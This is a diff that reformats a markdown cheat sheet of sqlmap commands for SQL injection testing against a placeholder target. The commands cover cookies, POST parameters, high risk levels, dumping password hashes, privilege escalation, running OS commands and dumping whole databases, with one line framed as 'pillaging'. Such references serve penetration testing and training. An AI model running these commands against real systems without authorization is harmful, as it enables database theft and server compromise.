@@ -2,34 +2,59 @@
 
 ## Command
 - Target the http://target.server.com URL using the “-u” flag:
-```sqlmap -u 'http://target.server.com'```
+```
+sqlmap -u 'http://target.server.com'
+```
 
 - Specify POST requests by specifying the “–data” flag:
-```sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah'```
+```
+sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah'
+```
 
 - Target a vulnerable parameter in an authenticated session by specifying cookies using the “–cookie” flag:
-```sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'```
+```
+sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'
+```
 
 - Drop all Set-Cookie requests from the target web server using the “–drop-set-cookie” flag:
-```sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie```
+```
+sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie
+```
 - Perform in-depth and risky attacks using the “–level” and “–risk” flags:
-```sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3```
+```
+sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3
+```
 - Specify which POST or GET parameter to target using the “-p” flag:
-```sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1```
+```
+sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1
+```
 - Choose a random User-Agent request header using the “–random-agent” flag:
-```sqlmap -u 'http://target.server.com' -r req.txt --random-agent```
+```
+sqlmap -u 'http://target.server.com' -r req.txt --random-agent
+```
 - Target a certain database service using the “–dbms” flag:
-```sqlmap -u 'http://target.server.com' -r req.txt --dbms Oracle```
+```
+sqlmap -u 'http://target.server.com' -r req.txt --dbms Oracle
+```
 - Read a request (stored via Burpsuite) target the user parameter (and no other parameters), run risky queries, and dump users and passwords:
-```sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords```
+```
+sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords
+```
 - Attempt privilege escalation on the target database
-```sqlmap -r ./req.txt --level=1 --risk=3 --privesc```
+```
+sqlmap -r ./req.txt --level=1 --risk=3 --privesc
+```
 - Run the “whoami” command on the target server.
-```sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami```
+```
+sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami
+```
 - Dump everything in the database, but wait one second in-between requests.
-```sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1```
+```
+sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1
+```
 - Here are some useful options for your pillaging pleasure:
-```-r req.txt Specify a request stored in a text file, great for saved requests from BurpSuite.
+```
+-r req.txt Specify a request stored in a text file, great for saved requests from BurpSuite.
 –force-ssl Force SQLmap to use SSL or TLS for its requests.
 –level=1 only test against the specified parameter, ignore all others.
 –risk=3 Run all exploit attempts, even the dangerous ones (could damage database).
